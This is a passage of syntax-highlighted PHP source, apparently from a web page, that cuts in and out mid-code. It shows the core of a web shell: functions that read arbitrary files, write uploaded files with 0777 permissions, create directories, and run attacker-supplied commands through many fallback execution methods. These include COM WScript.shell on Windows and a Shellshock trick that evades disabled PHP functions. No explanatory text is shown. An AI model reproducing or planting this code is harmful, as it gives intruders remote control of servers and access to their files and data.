variable\">$fullPath</span><span class=\"token punctuation\">)</span><span class=\"token operator\">?</span><span class=\"token string double-quoted-string\">\"W\"</span><span class=\"token punctuation\">:</span><span class=\"token string double-quoted-string\">\"\"</span><span class=\"token punctuation\">)</span><span class=\"token operator\">.</span><span class=\"token punctuation\">(</span>@<span class=\"token function\">is_executable</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$fullPath</span><span class=\"token punctuation\">)</span><span class=\"token operator\">?</span><span class=\"token string double-quoted-string\">\"X\"</span><span class=\"token punctuation\">:</span><span class=\"token string double-quoted-string\">\"\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token function\">array_push</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$lineData</span><span class=\"token punctuation\">,</span><span class=\"token punctuation\">(</span><span class=\"token function\">strlen</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$fr</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&gt;</span><span class=\"token number\">0</span><span class=\"token operator\">?</span><span class=\"token variable\">$fr</span><span class=\"token punctuation\">:</span><span class=\"token string double-quoted-string\">\"F\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token variable\">$data</span><span class=\"token operator\">.=</span><span class=\"token punctuation\">(</span><span class=\"token function\">implode</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"\\t\"</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$lineData</span><span class=\"token punctuation\">)</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\"\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token punctuation\">}</span> <span class=\"token punctuation\">}</span> <span class=\"token punctuation\">}</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">{</span> <span class=\"token keyword\">return</span> <span class=\"token string double-quoted-string\">\"Path Not Found Or No Permission!\"</span><span class=\"token punctuation\">;</span> <span class=\"token punctuation\">}</span> <span class=\"token keyword\">return</span> <span class=\"token variable\">$data</span><span class=\"token punctuation\">;</span> <span class=\"token punctuation\">}</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">readFileContent</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span> <span class=\"token variable\">$fileName</span><span class=\"token operator\">=</span><span class=\"token function\">get</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"fileName\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>@<span class=\"token function\">is_file</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$fileName</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span> <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">function_existsEx</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"is_readable\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span> <span class=\"token keyword\">return</span> <span class=\"token function\">file_get_contents</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$fileName</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token punctuation\">}</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">{</span> <span class=\"token keyword\">return</span> <span class=\"token string double-quoted-string\">\"No Permission!\"</span><span class=\"token punctuation\">;</span> <span class=\"token punctuation\">}</span> <span class=\"token punctuation\">}</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">{</span> <span class=\"token keyword\">return</span> <span class=\"token string double-quoted-string\">\"File Not Found\"</span><span class=\"token punctuation\">;</span> <span class=\"token punctuation\">}</span> <span class=\"token punctuation\">}</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">uploadFile</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span> <span class=\"token variable\">$fileName</span><span class=\"token operator\">=</span><span class=\"token function\">get</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"fileName\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token variable\">$fileValue</span><span class=\"token operator\">=</span><span class=\"token function\">get</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"fileValue\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>@<span class=\"token function\">file_put_contents</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$fileName</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$fileValue</span><span class=\"token punctuation\">)</span><span class=\"token operator\">!==</span><span class=\"token constant boolean\">false</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span> @<span class=\"token function\">chmod</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$fileName</span><span class=\"token punctuation\">,</span><span class=\"token number\">0777</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token keyword\">return</span> <span class=\"token string double-quoted-string\">\"ok\"</span><span class=\"token punctuation\">;</span> <span class=\"token punctuation\">}</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">{</span> <span class=\"token keyword\">return</span> <span class=\"token string double-quoted-string\">\"fail\"</span><span class=\"token punctuation\">;</span> <span class=\"token punctuation\">}</span> <span class=\"token punctuation\">}</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">newDir</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span> <span class=\"token variable\">$dir</span><span class=\"token operator\">=</span><span class=\"token function\">get</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"dirName\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>@<span class=\"token function\">mkdir</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$dir</span><span class=\"token punctuation\">,</span><span class=\"token number\">0777</span><span class=\"token punctuation\">,</span><span class=\"token constant boolean\">true</span><span class=\"token punctuation\">)</span><span class=\"token operator\">!==</span><span class=\"token constant boolean\">false</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span> <span class=\"token keyword\">return</span> <span class=\"token string double-quoted-string\">\"ok\"</span><span class=\"token punctuation\">;</span> <span class=\"token punctuation\">}</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">{</span> <span class=\"token keyword\">return</span> <span class=\"token string double-quoted-string\">\"fail\"</span><span class=\"token punctuation\">;</span> <span class=\"token punctuation\">}</span> <span class=\"token punctuation\">}</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">newFile</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span> <span class=\"token variable\">$fileName</span><span class=\"token operator\">=</span><span class=\"token function\">get</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"fileName\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>@<span class=\"token function\">file_put_contents</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$fileName</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"\"</span><span class=\"token punctuation\">)</span><span class=\"token operator\">!==</span><span class=\"token constant boolean\">false</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span> <span class=\"token keyword\">return</span> <span class=\"token string double-quoted-string\">\"ok\"</span><span class=\"token punctuation\">;</span> <span class=\"token punctuation\">}</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">{</span> <span class=\"token keyword\">return</span> <span class=\"token string double-quoted-string\">\"fail\"</span><span class=\"token punctuation\">;</span> <span class=\"token punctuation\">}</span> <span class=\"token punctuation\">}</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">function_existsEx</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$functionName</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span> <span class=\"token variable\">$d</span><span class=\"token operator\">=</span><span class=\"token function\">explode</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\",\"</span><span class=\"token punctuation\">,</span>@<span class=\"token function\">ini_get</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"disable_functions\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">empty</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$d</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span> <span class=\"token variable\">$d</span><span class=\"token operator\">=</span><span class=\"token keyword\">array</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token punctuation\">}</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">{</span> <span class=\"token variable\">$d</span><span class=\"token operator\">=</span><span class=\"token function\">array_map</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'trim'</span><span class=\"token punctuation\">,</span><span class=\"token function\">array_map</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'strtolower'</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$d</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token punctuation\">}</span> <span class=\"token keyword\">return</span><span class=\"token punctuation\">(</span><span class=\"token function\">function_exists</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$functionName</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&amp;&amp;</span><span class=\"token function\">is_callable</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$functionName</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&amp;&amp;</span><span class=\"token operator\">!</span><span class=\"token function\">in_array</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$functionName</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$d</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token punctuation\">}</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">execCommand</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span> @<span class=\"token function\">ob_start</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token variable\">$cmdLine</span><span class=\"token operator\">=</span><span class=\"token function\">get</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"cmdLine\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">substr</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token operator\">==</span><span class=\"token string double-quoted-string\">\"/\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span> @<span class=\"token function\">putenv</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"PATH=\"</span><span class=\"token operator\">.</span><span class=\"token function\">getenv</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"PATH\"</span><span class=\"token punctuation\">)</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\":/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token punctuation\">}</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">{</span> @<span class=\"token function\">putenv</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"PATH=\"</span><span class=\"token operator\">.</span><span class=\"token function\">getenv</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"PATH\"</span><span class=\"token punctuation\">)</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\";C:/Windows/system32;C:/Windows/SysWOW64;C:/Windows;C:/Windows/System32/WindowsPowerShell/v1.0/;\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token punctuation\">}</span> <span class=\"token variable\">$result</span><span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"\"</span><span class=\"token punctuation\">;</span> <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">function_existsEx</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"runshellshock\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">runshellshock</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$d</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$c</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span> <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">substr</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$d</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token string double-quoted-string\">\"/\"</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token function\">function_existsEx</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'putenv'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token punctuation\">(</span><span class=\"token function\">function_existsEx</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'error_log'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">||</span> <span class=\"token class-name\">function_existsEx</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'mail'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span> <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">strstr</span><span class=\"token punctuation\">(</span><span class=\"token function\">readlink</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/bin/sh\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"bash\"</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">!=</span> <span class=\"token constant boolean\">FALSE</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span> <span class=\"token variable\">$tmp</span> <span class=\"token operator\">=</span> <span class=\"token function\">tempnam</span><span class=\"token punctuation\">(</span><span class=\"token function\">sys_get_temp_dir</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'as'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token function\">putenv</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"PHP_LOL=() { x; }; <span class=\"token interpolation\"><span class=\"token variable\">$c</span></span> &gt;<span class=\"token interpolation\"><span class=\"token variable\">$tmp</span></span> 2&gt;&amp;1\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">function_existsEx</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'error_log'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span> <span class=\"token function\">error_log</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"a\"</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token punctuation\">}</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">{</span> <span class=\"token function\">mail</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"a@127.0.0.1\"</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"\"</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"\"</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"-bv\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token punctuation\">}</span> <span class=\"token punctuation\">}</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">{</span> <span class=\"token keyword\">return</span> <span class=\"token constant boolean\">False</span><span class=\"token punctuation\">;</span> <span class=\"token punctuation\">}</span> <span class=\"token variable\">$output</span> <span class=\"token operator\">=</span> @<span class=\"token function\">file_get_contents</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$tmp</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> @<span class=\"token function\">unlink</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$tmp</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$output</span> <span class=\"token operator\">!=</span> <span class=\"token string double-quoted-string\">\"\"</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span> <span class=\"token keyword\">return</span> <span class=\"token variable\">$output</span><span class=\"token punctuation\">;</span> <span class=\"token punctuation\">}</span> <span class=\"token punctuation\">}</span> <span class=\"token keyword\">return</span> <span class=\"token constant boolean\">False</span><span class=\"token punctuation\">;</span> <span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span> <span class=\"token punctuation\">}</span> <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">function_existsEx</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'system'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span> @<span class=\"token function\">system</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$cmdLine</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$ret</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token punctuation\">}</span><span class=\"token keyword\">elseif</span><span class=\"token punctuation\">(</span><span class=\"token function\">function_existsEx</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'passthru'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span> <span class=\"token variable\">$result</span><span class=\"token operator\">=</span>@<span class=\"token function\">passthru</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$cmdLine</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$ret</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token punctuation\">}</span><span class=\"token keyword\">elseif</span><span class=\"token punctuation\">(</span><span class=\"token function\">function_existsEx</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'shell_exec'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span> <span class=\"token variable\">$result</span><span class=\"token operator\">=</span>@<span class=\"token function\">shell_exec</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$cmdLine</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token punctuation\">}</span><span class=\"token keyword\">elseif</span><span class=\"token punctuation\">(</span><span class=\"token function\">function_existsEx</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'exec'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span> @<span class=\"token function\">exec</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$cmdLine</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$o</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$ret</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token variable\">$result</span><span class=\"token operator\">=</span><span class=\"token function\">join</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"\\n\"</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$o</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token punctuation\">}</span><span class=\"token keyword\">elseif</span><span class=\"token punctuation\">(</span><span class=\"token function\">function_existsEx</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'popen'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span> <span class=\"token variable\">$fp</span><span class=\"token operator\">=</span>@<span class=\"token function\">popen</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$cmdLine</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'r'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token keyword\">while</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span>@<span class=\"token function\">feof</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$fp</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span> <span class=\"token variable\">$result</span><span class=\"token operator\">.=</span>@<span class=\"token function\">fgets</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$fp</span><span class=\"token punctuation\">,</span><span class=\"token number\">1024</span><span class=\"token operator\">*</span><span class=\"token number\">1024</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token punctuation\">}</span> @<span class=\"token function\">pclose</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$fp</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token punctuation\">}</span><span class=\"token keyword\">elseif</span><span class=\"token punctuation\">(</span><span class=\"token function\">function_existsEx</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'proc_open'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span> <span class=\"token variable\">$p</span> <span class=\"token operator\">=</span> @<span class=\"token function\">proc_open</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$cmdLine</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">array</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span> <span class=\"token operator\">=&gt;</span> <span class=\"token keyword\">array</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'pipe'</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'w'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span> <span class=\"token operator\">=&gt;</span> <span class=\"token keyword\">array</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'pipe'</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'w'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$io</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token keyword\">while</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span>@<span class=\"token function\">feof</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$io</span><span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span> <span class=\"token variable\">$result</span><span class=\"token operator\">.=</span>@<span class=\"token function\">fgets</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$io</span><span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span><span class=\"token number\">1024</span><span class=\"token operator\">*</span><span class=\"token number\">1024</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token punctuation\">}</span> <span class=\"token keyword\">while</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span>@<span class=\"token function\">feof</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$io</span><span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span> <span class=\"token variable\">$result</span><span class=\"token operator\">.=</span>@<span class=\"token function\">fgets</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$io</span><span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span><span class=\"token number\">1024</span><span class=\"token operator\">*</span><span class=\"token number\">1024</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token punctuation\">}</span> @<span class=\"token function\">fclose</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$io</span><span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> @<span class=\"token function\">fclose</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$io</span><span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> @<span class=\"token function\">proc_close</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$p</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token punctuation\">}</span><span class=\"token keyword\">elseif</span><span class=\"token punctuation\">(</span><span class=\"token function\">substr</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token operator\">!=</span><span class=\"token string double-quoted-string\">\"/\"</span> <span class=\"token operator\">&amp;&amp;</span> @<span class=\"token function\">class_exists</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"COM\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span> <span class=\"token variable\">$w</span><span class=\"token operator\">=</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">COM</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'WScript.shell'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token variable\">$e</span><span class=\"token operator\">=</span><span class=\"token variable\">$w</span><span class=\"token operator\">-&gt;</span><span class=\"token function\">exec</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$cmdLine</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token variable\">$so</span><span class=\"token operator\">=</span><span class=\"token variable\">$e</span><span class=\"token operator\">-&gt;</span><span class=\"token function\">StdOut</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token variable\">$result</span><span class=\"token operator\">.=</span><span class=\"token variable\">$so</span><span class=\"token operator\">-&gt;</span><span class=\"token function\">ReadAll</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token variable\">$se</span><span class=\"token operator\">=</span><span class=\"token variable\">$e</span><span class=\"token operator\">-&gt;</span><span class=\"token function\">StdErr</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token variable\">$result</span><span class=\"token operator\">.=</span><span class=\"token variable\">$se</span><span class=\"token operator\">-&gt;</span><span class=\"token function\">ReadAll</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token punctuation\">}</span><span class=\"token keyword\">elseif</span> <span class=\"token punctuation\">(</span><span class=\"token function\">function_existsEx</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"pcntl_fork\"</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&amp;&amp;</span><span class=\"token function\">function_existsEx</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"pcntl_exec\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span> <span class=\"token variable\">$cmd</span><span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"/bin/bash\"</span><span class=\"token punctuation\">;</span> <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">file_exists</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$cmd</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span> <span class=\"token variable\">$cmd</span><span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"/bin/sh\"</span><span class=\"token punctuation\">;</span> <span class=\"token punctuation\">}</span> <span class=\"token variable\">$commandFile</span><span class=\"token operator\">=</span><span class=\"token function\">sys_get_temp_dir</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\"/\"</span><span class=\"token operator\">.</span><span class=\"token function\">time</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\".log\"</span><span class=\"token punctuation\">;</span> <span class=\"token variable\">$resultFile</span><span class=\"token operator\">=</span><span class=\"token function\">sys_get_temp_dir</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\"/\"</span><span class=\"token operator\">.</span><span class=\"token punctuation\">(</span><span class=\"token function\">time</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span><span class=\"token number\">1</span><span class=\"token 